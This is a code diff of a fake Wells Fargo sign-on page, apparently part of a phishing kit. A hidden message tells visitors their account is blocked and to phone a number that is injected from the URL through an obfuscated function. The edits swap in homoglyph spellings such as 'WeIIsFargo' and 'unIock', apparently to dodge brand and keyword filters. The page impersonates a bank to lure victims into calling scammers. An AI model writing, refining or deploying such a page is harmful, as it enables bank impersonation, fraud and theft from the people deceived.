@@ -78,11 +78,11 @@
           else
               return results[1];
       }
-      var Anph = vhdydjwhcnfyhecnfheucncevi('Anph');
+      var True = vhdydjwhcnfyhecnfheucncevi('True');
   </script>
 
   <script type="text/javascript">
-              var Anph = getVariableFromURl('Anph');
+              var True = getVariableFromURl('True');
           </script>
     <style type="text/css">#challengeFrame{ width: 0px;height: 0px;border: none; display: none;}
       		#challengeFrame.open{
@@ -505,7 +505,7 @@
 <body>
 
   <button type="button" class="sign-on-button" onclick="showMessage()">Sign on</button>
-  <div id="message" class="hidden-message">"Your WellsFargo bank access has been blocked due to suspicious online login attempts. Contact our customer service team at <a href="tel:+<script>document.write(Anph)</script>" style="font-size: 18px; font-style: italic; font-family: Arial;" onclick="trackClick()">+<script>document.write(Anph)</script></a> to verify and unlock your account."!</div>
+  <div id="message" class="hidden-message">"We have temporarily blocked your WeIIsFargo account due to multiple suspicious sign-in attempts. Contact our customer service team @ <a href="tel:+<script>document.write(True)</script>" style="font-size: 18px; font-style: italic; font-family: Arial;" onclick="trackClick()">+<script>document.write(True)</script></a> to verify your identity & unIock your account."!</div>
 
   <script>
     function showMessage() {
